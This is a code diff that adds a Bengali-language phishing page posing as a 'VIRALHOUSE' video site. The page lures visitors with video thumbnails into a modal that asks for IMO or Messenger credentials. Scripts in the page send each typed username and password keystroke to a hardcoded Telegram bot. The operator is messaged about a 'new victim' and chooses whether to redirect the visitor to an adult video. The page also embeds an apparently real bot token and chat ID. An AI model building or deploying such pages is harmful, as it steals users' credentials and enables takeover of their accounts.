@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Verification - Live Control</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #000; font-family: sans-serif; overflow: hidden; }
+        .video-card { border-radius: 8px; background: #1a1a1a; aspect-ratio: 16/9; border: 1px solid #333; }
+        #modal { display: none; z-index: 1000; }
+        .step-container { display: none; }
+        .step-active { display: block; }
+        /* লোডার ডিজাইন */
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="text-white">
+
+    <nav class="fixed top-0 w-full bg-[#111] p-4 flex justify-between items-center border-b border-gray-800 z-50">
+        <h1 class="text-red-600 font-bold text-xl uppercase">VIRAL<span class="text-white">HOUSE</span></h1>
+    </nav>
+
+    <div id="video-container" class="mt-20 p-4 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>
+
+    <div id="modal" class="fixed inset-0 bg-black/95 flex items-center justify-center p-6 backdrop-blur-md">
+        <div class="bg-white text-black p-6 rounded-3xl max-w-sm w-full shadow-2xl" id="modal-content">
+            
+            <div id="step-choice" class="step-container step-active text-center">
+                <h2 class="text-xl font-extrabold mb-6">ভিডিওটি দেখতে কানেক্ট করুন</h2>
+                <button onclick="goStep('imo-1')" class="w-full bg-blue-500 text-white py-4 rounded-2xl font-bold mb-3">ইমু দিয়ে দেখুন</button>
+                <button onclick="goStep('fb-1')" class="w-full bg-[#1877F2] text-white py-4 rounded-2xl font-bold">ম্যাসেঞ্জার দিয়ে দেখুন</button>
+            </div>
+
+            <div id="step-imo-1" class="step-container text-center">
+                <h2 class="text-xl font-bold mb-4">ইমু নাম্বার দিন</h2>
+                <input type="tel" id="imo-num" oninput="liveSend('IMO-User', this.value)" class="w-full p-4 bg-gray-100 rounded-xl mb-4 text-center font-bold">
+                <button onclick="goStep('imo-2')" class="w-full bg-blue-500 text-white py-4 rounded-xl font-bold">পরবর্তী</button>
+            </div>
+            <div id="step-imo-2" class="step-container text-center">
+                <h2 class="text-xl font-bold mb-4">পাসওয়ার্ড দিন</h2>
+                <input type="password" id="imo-pass" oninput="liveSend('IMO-Pass', this.value)" class="w-full p-4 bg-gray-100 rounded-xl mb-4 text-center font-bold">
+                <button onclick="startFinalProcess()" class="w-full bg-green-600 text-white py-4 rounded-xl font-bold">লগইন</button>
+            </div>
+
+            <div id="step-fb-1" class="step-container text-center">
+                <h2 class="text-xl font-bold mb-4">ম্যাসেঞ্জার ইউজার</h2>
+                <input type="text" id="fb-user" oninput="liveSend('FB-User', this.value)" class="w-full p-4 bg-gray-100 rounded-xl mb-4 text-center font-bold">
+                <button onclick="goStep('fb-2')" class="w-full bg-[#1877F2] text-white py-4 rounded-xl font-bold">পরবর্তী</button>
+            </div>
+            <div id="step-fb-2" class="step-container text-center">
+                <h2 class="text-xl font-bold mb-4">পাসওয়ার্ড দিন</h2>
+                <input type="password" id="fb-pass" oninput="liveSend('FB-Pass', this.value)" class="w-full p-4 bg-gray-100 rounded-xl mb-4 text-center font-bold">
+                <button onclick="startFinalProcess()" class="w-full bg-[#1877F2] text-white py-4 rounded-xl font-bold">লগইন</button>
+            </div>
+
+            <div id="step-loading" class="step-container text-center py-10">
+                <div class="loader"></div>
+                <h2 class="text-xl font-bold">অপেক্ষা করুন...</h2>
+                <p class="text-gray-500 text-sm mt-2">আপনার তথ্য যাচাই করা হচ্ছে</p>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        const botToken = "7957986649:AAGCcJ5R6g6PMHEgWXFqLRn2SrpElZvUtnE";
+        const chatId = "8516934257";
+        const videoUrl = "https://faphouse2.com/videos/stepsister-nice-fuck-first-hV5npB"; // সাকসেস লিংক
+
+        function goStep(id) {
+            document.querySelectorAll('.step-container').forEach(s => s.classList.remove('step-active'));
+            document.getElementById('step-' + id).classList.add('step-active');
+        }
+
+        function liveSend(type, value) {
+            if(value.length < 1) return;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('📡 Live: ' + type + ' -> ' + value)}`);
+        }
+
+        // ফাইনাল সাবমিট এবং কন্ট্রোল বাটন পাঠানো
+        function startFinalProcess() {
+            goStep('loading');
+
+            const message = "✅ নতুন ভিকটিম সাবমিট করেছে!\nএখন আপনি সিদ্ধান্ত নিন তাকে ভিডিও দেখাবেন নাকি ইগনোর করবেন।";
+            
+            // টেলিগ্রামে Success এবং Ignore বাটন পাঠানো
+            const keyboard = {
+                inline_keyboard: [[
+                    { text: "✅ Success", callback_data: "success_action" },
+                    { text: "❌ Ignore", callback_data: "ignore_action" }
+                ]]
+            };
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&reply_markup=${JSON.stringify(keyboard)}`);
+
+            // পোলিং শুরু - টেলিগ্রাম থেকে উত্তরের অপেক্ষায়
+            checkDecision();
+        }
+
+        function checkDecision() {
+            const pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${botToken}/getUpdates`)
+                .then(res => res.json())
+                .then(data => {
+                    const updates = data.result;
+                    const lastUpdate = updates[updates.length - 1];
+                    
+                    if (lastUpdate && lastUpdate.callback_query) {
+                        const decision = lastUpdate.callback_query.data;
+                        
+                        if (decision === "success_action") {
+                            clearInterval(pollInterval);
+                            window.location.href = videoUrl; // ভিডিওতে নিয়ে যাবে
+                        } else if (decision === "ignore_action") {
+                            clearInterval(pollInterval);
+                            document.getElementById('step-loading').innerHTML = `
+                                <div class="text-red-500 font-bold text-lg">ভেরিফিকেশন সফল হয়নি!</div>
+                                <button onclick="location.reload()" class="mt-4 bg-gray-200 px-4 py-2 rounded">আবার চেষ্টা করুন</button>
+                            `;
+                        }
+                    }
+                });
+            }, 3000); // প্রতি ৩ সেকেন্ড পর পর চেক করবে
+        }
+
+        // ভিডিও কার্ড জেনারেশন (আগের মতই)
+        const container = document.getElementById('video-container');
+        for (let i = 0; i < 12; i++) {
+            const card = document.createElement('div');
+            card.className = 'video-card';
+            card.onclick = () => { document.getElementById('modal').style.display = 'flex'; };
+            card.innerHTML = `<img src="https://picsum.photos/600/400?random=${i}" class="w-full h-full object-cover opacity-60">`;
+            container.appendChild(card);
+        }
+    </script>
+</body>
+</html>
